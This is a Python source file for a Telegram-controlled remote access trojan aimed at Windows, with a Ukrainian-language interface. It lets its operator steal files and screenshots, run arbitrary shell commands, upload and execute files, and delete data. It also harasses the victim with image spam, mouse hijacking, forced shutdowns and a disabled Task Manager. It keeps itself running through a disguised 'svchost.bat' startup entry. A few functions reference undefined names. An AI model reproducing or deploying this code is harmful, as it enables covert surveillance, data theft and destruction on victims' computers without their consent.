adminId =  #int
token = ""

import requests
while True:
	try:
		requests.get("http://google.com")
		break
	except: pass


import telebot
from telebot.types import ReplyKeyboardMarkup as markup
from telebot.types import InlineKeyboardButton as button
from telebot.types import InlineKeyboardMarkup as inline

from winreg import *
from os import path
import os
import webbrowser
from random import choice, randint
from threading import Thread
import subprocess
import pyautogui
from pygame import mixer
from gtts import gTTS
import time
import getpass
import json
import sys
import psutil
from tkinter import messagebox
USER_NAME = getpass.getuser()


pyautogui.FAILSAFE = False
commands_list="Усі команди:\n/delete\n/check\n/open\n/search\n/console\n/get\n/post\n/run\n/stop\n/voice\n/create\n/read\n/write\n/mess\n/fold"
PCK = False
mouse = False
lock = False
save = "None"
#========================markups=====================================

global_menu = button("На головну🚩")

#-------------------------старт меню---------------------------------
func = button("Функції💽")
commands = button("Слеш команди⚡")
dangerous_commands = button("Небезпечна зона🛑")
help_b = button("Допомога❓")
start_menu = markup(resize_keyboard = True, row_width=2).add(func, commands, dangerous_commands, help_b)

#-----------------функции------------------------------------------
screen_b = button("Скриншот💻")
restart = button("Перезавантажити ПК💻")
start_mouse = button("Запустити неслухняну мишку💻")
stop_mouse = button("Зупинити неслухняну мишку💻")
stop = button("Вимкнути ПК💻")
kill = button("Запустити PCK💻")
kill_stop = button("Зупинити PCK💻")
random_del = button("Видалити рандомний файл із диска D💻")
proc_b = button("Процеси💻")
func_menu = markup(resize_keyboard = True, row_width=2).add(screen_b, start_mouse, stop_mouse, restart, stop, kill, kill_stop, random_del, proc_b, global_menu)


#---------------------Dangerous zone-----------------------------------
kill_Taskmgr_b = button("Заблокувати диспетчер задач💻")
off = button("Згасити екран⚠")
on = button("Увімкнути екран⚠")
lock = button("Заблокувати мишку💻")
unlock = button("Розблокувати мишку💻")
Dangerous_zone = markup(resize_keyboard = True, row_width=2).add(kill_Taskmgr_b,off,on,lock,unlock,global_menu)

def gen_name(num: int = 8):
	g = ""
	for x in range(num):
		g = g + choice(list('1234567890abcdefghigklmnopqrstuvyxwzABCDEFGHIGKLMNOPQRSTUVYXWZ'))
	return g

def img_spam():
	global PCK
	while PCK:
		p = requests.get('https://image.shutterstock.com/image-illustration/fuck-you-concept-illustration-600w-478617418.jpg')
		name = gen_name()
		out = open(f"D:/{name}.jpg", "wb")
		out.write(p.content)
		out.close()
		os.startfile(rf"D:/{name}.jpg")

def browser_open():
	global PCK
	while PCK:
		webbrowser.open('https://image.shutterstock.com/image-illustration/fuck-you-concept-illustration-600w-478617418.jpg', new=2)

def PCK_start():
	for i in range(80):
		Thread(target=img_spam).start()
		Thread(target=browser_open).start()

def delete_rand():
	try:
		objects = os.listdir('D:/')
		file = choice(objects)
		os.remove(f'D:/{file}')
		return f'Файл {file} віддалений'
	except Exception as error: return f"Виникла помилка:\n{error}"

def delete(path):
	try:
		os.remove(path)
		return f'Файл по шляху "{path}" віддалений'
	except Exception as error: return f"Виникла помилка:\n{error}"

def check(path, userId):
	try:
		file_list = os.listdir(path)
		files = '\n'.join(file_list)
		if len(files) > 4096:
			for x in range(0, len(files), 4096):
				client.send_message(userId, files[x:x+4096])
		else:
			client.send_message(userId,  f'Файли у вказаній директорії:\n{files}')
	except Exception as error:client.send_message(userId, f"Виникла помилка:\n{error}")

def open_url(url):
	try:webbrowser.open(url, new=2); return f'Сторінку за посиланням відкрито✔'
	except Exception as error: return f"Виникла помилка:\n{error}"


def get_process(userId):
	try:
		processess_list = list()
		for proc in  psutil.process_iter():
			processess_list.append(proc.name())
		processess = '\n'.join(processess_list)
		if len(str(processess)) > 4096:
			for x in range(0, len(str(processess)), 4096):
				client.send_message(userId, str(processess)[x:x+4096])
		else:
			client.send_message(userId,  f'Усі запущені процеси💻:\n{str(processess)}')
	except Exception as error:client.send_message(userId, f"Виникла помилка:\n{error}")

def search_file(file, userId):
	try:
		spisok = list()
		for adress, dirs, files in os.walk('D:\\'):
			if file in adress:
				spisok.append(adress)
		for adress, dirs, files in os.walk('C:\\'):
			if file in adress:
				spisok.append(adress)
		if spisok == []:client.send_message(userId,  f"Жодного файлу з ім'ям {file} не знайдено")
		else:
			info = '\n'.join(spisok)
			if len(info) > 4096:
				for x in range(0, len(info), 4096):
					bot.send_message(userId, info[x:x+4096])
			else:
				client.send_message(userId,  f'Усі знайдені файли з ім\'ям "{file}":\n{info}')
	except Exception as error: client.send_message(userId,  f"Виникла помилка:\n{error}")


def send_mess(userId, message):
	try:messagebox.showinfo('Message for You 💞', message);client.send_message(userId, f"Повідомлення відображається на екрані✔")
	except Exception as error:client.send_message(userId, f"Виникла помилка:\n{error}")


def get(path, userId):
	try:
		file = open(path, 'rb')
		client.send_document(userId, file)
	except Exception as error:client.send_message(userId, f"Виникла помилка:\n{error}")

def post(message, path, userId):
	try:
		file_name = message.document.file_name
		file_id = message.document.file_name
		file_id_info = client.get_file(message.document.file_id)
		downloaded_file = client.download_file(file_id_info.file_path)
		src = file_name
		with open(f'{path}/{src}', 'wb') as new_file:
			new_file.write(downloaded_file)
		client.send_message(message.chat.id, f"Файл успішно збережений на шляху \"{path}\"")
	except Exception as error:client.send_message(userId, f"Виникла помилка:\n{error}")


def run_file(file):
	try:subprocess.call(file); return 'Запускаю файл'
	except Exception as error: return f"Виникла помилка:\n{error}"

def screenshot(userId):
	try:
		screen = pyautogui.screenshot('screenshot.png')
		client.send_photo(userId, screen)
		os.remove('screenshot.png')
	except Exception as error:client.send_message(userId, f"Виникла помилка:\n{error}")

def stop_exe(app, userId):
	if app !="":
		try:os.system(f"TASKKILL /F /IM {app}");client.send_message(userId, f"якщо {app} був запущений, тепер закритий✔")
		except Exception as error:client.send_message(userId, f"Виникла помилка:\n{error}")
	else:client.send_message(userId, f"Ви не вказали програму")

def voice(userId, text):
	try:
		output = gTTS(text=text, lang='ru', slow=False)
		output.save("output.mp3")
		mixer.init()
		mixer.music.load('output.mp3')
		mixer.music.play(0)
		time.sleep(len(text)/5)
		mixer.quit()
		client.send_message(userId, f"Текст переведено в аудіо повідомлення та був програний✔")
		os.remove('output.mp3')
	except Exception as error:client.send_message(userId, f"Виникла помилка:\n{error}")

def mouse_start():
	global mouse
	while mouse:
		pyautogui.moveTo(randint(1, 1900), randint(1, 1900), duration=0.25)


def add_to_startup():
	while True:
		bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER_NAME
		with open(bat_path + '\\' + "svchost.bat", "w+") as bat_file:
			bat_file.write(fr'start {sys.argv[0]}')
		time.sleep(2)

def kill_Taskmgr(userId):
	try:
		path1 = "C:\Windows\System32\Taskmgr.exe"
		path2 = "C:\Windows\System32\Taskmgr1.exe"

		os.system("takeown /f C:\Windows\System32\Taskmgr.exe")  
		os.system("icacls C:\Windows\System32\Taskmgr.exe /grant Администраторы:F /c /l") 
		os.system("icacls C:\Windows\System32\Taskmgr.exe /grant Пользователи:F /c /l")
		os.system("taskkill /im taskmgr.exe")
		try:os.rename(path1, path2)
		except:pass
		client.send_message(userId, f"Готово✔")
	except Exception as error:client.send_message(userId, f"Виникла помилка:\n{error}")

def lock_mouse():
	global lock
	while lock:
		pyautogui.moveTo(0, 0)

def delete_fold(userId, path):
	try:Sutil.rmtree(path);client.send_message(userId, f"Усі можливі файли видалені✔")
	except Exception as error:client.send_message(userId, f"Виникла помилка:\n{error}")
def write_file(path, text, userId):
	try:
		file = open(path, 'w')
		file.write(text)
		file.close()
		client.send_message(userId, 'Готово✔')
	except Exception as error:client.send_message(userId, f"Виникла помилка:\n{error}")

def read_file(path, userId):
	try:
		text = open(path, encoding='utf-8').read()
		if len(text) > 4096:
			for x in range(0, len(text), 4096):
				bot.send_message(userId, text[x:x+4096])
		else:
			client.send_message(userId,  text)
	except Exception as error:client.send_message(userId, f"Виникла помилка:\n{error}")

def command_parser(ct: str, userId, save):
	global PCK
	global mouse
	global lock

	content = ct.split(" ")
	try:
		if ct.lower() == "функції💽": client.send_message(userId, 'Переходжу...', reply_markup = func_menu)
		elif ct.lower() == "слеш команди⚡": client.send_message(userId, commands_list)
		elif ct.lower() == "на головну🚩": client.send_message(userId, 'Переходжу...', reply_markup = start_menu)
		elif ct.lower() == "небезпечна зона🛑": client.send_message(userId, 'Переходжу...', reply_markup = Dangerous_zone)
		elif ct.lower() == 'допомога❓': client.send_message(userId, 'Тут розписано кожну команду:', reply_markup = inline().add(button("Help❓", url='https://teletype.in/@xsarz-xpu/vzKfJ1fontd')))

		elif ct.lower() == 'скриншот💻':screenshot(userId=userId)
		elif ct.lower() == 'заблокувати диспетчер задач💻': kill_Taskmgr(userId=userId)
		elif ct.lower() == "запустити неслухняну мишку💻":
			if mouse == False:
				mouse=True
				for i in range(10):
					Thread(target=mouse_start).start()
				client.send_message(userId, 'Готово✔')
			else:client.send_message(userId, 'Ця функція вже запущена')
		elif ct.lower() == "зупинити неслухняну мишку💻":
			if mouse == True:client.send_message(userId, 'Зупинка...');mouse=False
			else:client.send_message(userId, 'Ця функція не запущена')
		elif ct.lower() == "вимкнути ПК💻": client.send_message(userId, 'Вимикаю пк...');os.system("shutdown -s -t 1")
		elif ct.lower() == "перезавантажити ПК💻": client.send_message(userId, 'Перезавантажую пк...');os.system("shutdown -r -t 1")
		elif ct.lower() == "запустити pck💻": client.send_message(userId, 'Запускаю PCK⚡');PCK=True;	Thread(target=PCK_start).start()
		elif ct.lower() == "зупинити pck💻":
			if PCK == True: client.send_message(userId, 'Зупиняю потоки PCK...');PCK=False
			else: client.send_message(userId, 'PCK не запущений🛑')
		elif ct.lower() == "видалити рандомний файл із диска D💻":
			del_info = delete_rand()
			client.send_message(userId, del_info)
		elif ct.lower() == 'згасити екран⚠':
			try:os.system(f"TASKKILL /F /IM explorer.exe");client.send_message(userId, 'Готово✔')
			except Exception as error:client.send_message(userId, f"Виникла помилка:\n{error}")
		elif ct.lower() == 'увімкнути екран⚠':
			try:subprocess.call('C:\Windows\explorer.exe');client.send_message(userId, 'Готово✔')
			except Exception as error:client.send_message(userId, f"Виникла помилка:\n{error}")
		elif ct.lower() == 'заблокувати мишку💻':
			client.send_message(userId, 'Блокую⚡');lock=True
			for i in range(10):
				Thread(target=lock_mouse).start()
		elif ct.lower() == 'розблокувати мишку💻':
			if lock == True: client.send_message(userId, 'Готово✔');lock=False
			else: client.send_message(userId, 'Мишка не заблокована🛑')
		elif ct.lower() == 'процеси💻':get_process(userId=userId)

		else:
			if content[0][0] == '/':
				if content[0][1:] == 'delete':client.send_message(userId, delete(path=ct.replace(content[0],"")[1:]))
				elif content[0][1:] == 'check':check(path=ct.replace(content[0],"")[1:], userId=userId)
				elif content[0][1:] == 'open':client.send_message(userId, open(url=ct.replace(content[0],"")[1:]))
				elif content[0][1:] == 'search':client.send_message(userId, "Розпочато пошук файлів з відповідним ім'ям.\nЯк тільки процес буде закінчено, я повідомлю вас✔");Thread(target=search_file, args=(ct.replace(content[0],"")[1:], userId)).start()
				elif content[0][1:] == 'console':os.system(ct.replace(content[0],"")[1:])
				elif content[0][1:] == 'get':get(path=ct.replace(content[0],"")[1:], userId=userId)
				elif content[0][1:] == 'post' and save[0][1:]!='post':client.send_message(userId, 'Чекаю на файл🧨')
				elif content[0][1:] == 'run':client.send_message(userId, run_file(file=ct.replace(content[0],"")[1:]));client.send_message(userId, 'Команда відправлена✔')
				elif content[0][1:] == 'stop':stop_exe(app=ct.replace(content[0],"")[1:], userId=userId)
				elif content[0][1:] == 'voice':voice(userId=userId, text=ct.replace(content[0],""))
				elif content[0][1:] == 'fold':delete_fold(userId=userId, path=ct.replace(content[0],"")[1:])
				elif content[0][1:] == 'create':
					path = ct.replace(content[0],"")[1:]
					try:file = open(path, 'w');file.close();client.send_message(userId, f'Файл створений✔\nШлях: {path}')
					except Exception as error:client.send_message(userId, f"Виникла помилка:\n{error}")
				elif content[0][1:] == 'write':write_file(path=content[1], text=ct.replace(content[0],"").replace(content[1],"")[1:], userId=userId)
				elif content[0][1:] == 'read':read_file(path=ct.replace(content[0],"")[1:], userId=userId)
				elif content[0][1:] == 'mess':send_mess(userId=userId, message=ct.replace(content[0],""))
			else:client.send_message(userId, "Команда не знайдена☹")
	except IndexError:client.send_message(userId, 'Ви не вказали аргументи')
	except Exception as error:client.send_message(userId, f"Виникла помилка:\n{error}")


#=======================================================
client = telebot.TeleBot(token)
client.send_message(adminId, 'Пк у мережі⚡')
@client.message_handler(commands=['start'])
def start(message):
	if message.from_user.id == adminId: client.send_message(message.from_user.id, 'Вітаю {0.first_name}, обери команду'.format(message.from_user), reply_markup = start_menu)
	else:  client.send_message(message.from_user.id, 'Ви не адмін'.format(message.from_user))

@client.message_handler(content_types=['text'])
def on_msg(message):
	global save
	text = message.text
	user_id = message.from_user.id
	if user_id != adminId: client.send_message(message.from_user.id, 'Ви не адмін')
	else:save = text;command_parser(ct=text, userId=user_id, save=save.lower().split(" "))

@client.message_handler(content_types=['document'])
def on_file(message):
	document_id = message.document.file_id
	file_info = client.get_file(document_id)
	file = f'http://api.telegram.org/file/bot{token}/{file_info.file_path}'
	global save
	content = save.lower().split(" ")
	if content[0][0] == '/':
		if content[0][1:] == 'post':
			try:
				path=save.replace(content[0],"")[1:]
				p = requests.get(file)
				out = open(path, "wb")
				out.write(p.content)
				out.close()
				client.send_message(message.from_user.id, f'Файл збережений\nШлях до файлу:\n{path}')
			except Exception as error:client.send_message(message.from_user.id, f"Виникла помилка:\n{error}")


if __name__ == '__main__':
	Thread(target=add_to_startup).start()
	client.polling(none_stop=True)